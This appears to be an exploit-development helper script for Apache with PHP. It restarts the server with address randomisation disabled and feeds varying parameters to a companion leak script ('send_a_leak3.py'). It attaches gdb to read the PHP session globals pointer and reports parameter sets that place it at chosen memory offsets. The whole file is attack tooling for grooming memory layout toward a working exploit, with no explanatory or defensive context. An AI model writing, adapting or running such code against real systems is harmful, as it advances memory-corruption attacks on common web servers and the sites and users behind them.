#!/usr/bin/env python3
import subprocess,re,time
TARGET={0xc0,0x2c0,0x4c0,0x6c0,0x8c0,0xac0,0xcc0,0xec0}
def sh(c): return subprocess.run(c,shell=True,capture_output=True,text=True)
def stopstart():
    sh("sudo -n apache2ctl -k stop >/dev/null 2>&1"); time.sleep(0.12)
    sh('sudo -n bash -c "setarch $(uname -m) -R /usr/sbin/apache2ctl -k start" >/dev/null 2>&1'); time.sleep(0.18)
def getid():
    pid=sh('pgrep -f "^/usr/sbin/apache2 -k start" | tail -1').stdout.strip()
    if not pid: return None
    out=sh(f"sudo -n gdb -q -p {pid} -batch -ex 'p/x (unsigned long)ps_globals.id' 2>/dev/null").stdout
    m=re.search(r'\$\d+ = (0x[0-9a-f]+)',out); return int(m.group(1),16) if m else None
cases=[]
for nl in range(1,46): cases.append((nl,1,17))
for vl in range(1,73): cases.append((5,vl,17))
for bnl in range(5,32): cases.append((5,1,bnl))
seen=set()
for nl,vl,bnl in cases:
    if (nl,vl,bnl) in seen: continue
    seen.add((nl,vl,bnl))
    stopstart()
    sh(f"python3 send_a_leak3.py 1001 {nl} {vl} 12 {bnl} >/dev/null 2>&1"); time.sleep(0.08)
    a=getid()
    if not a: continue
    off=a&0xfff
    if off in TARGET:
        print(f"HIT nl={nl} vl={vl} bnl={bnl} ID=0x{a:x} OFF=0x{off:x}",flush=True)
